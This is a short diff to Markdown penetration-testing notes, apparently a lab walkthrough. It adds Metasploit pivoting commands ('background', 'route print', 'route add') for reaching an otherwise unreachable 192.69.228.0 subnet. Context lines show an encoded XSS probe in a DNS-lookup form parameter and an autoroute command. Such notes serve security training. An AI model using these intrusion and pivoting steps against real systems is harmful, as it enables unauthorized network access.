@@ -150,6 +150,12 @@ target_host=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&dns-lookup-php-submit-button
 ## pivot to the otherwise unreachanble network
 ```
 run autoroute -s 192.69.228.0 -n 255.255.255.0
+``````
+background
+route print
+```
+```
+route add 192.69.228.0 255.255.255.0 1
 ```
 ## Scan subnet with msf
 ```
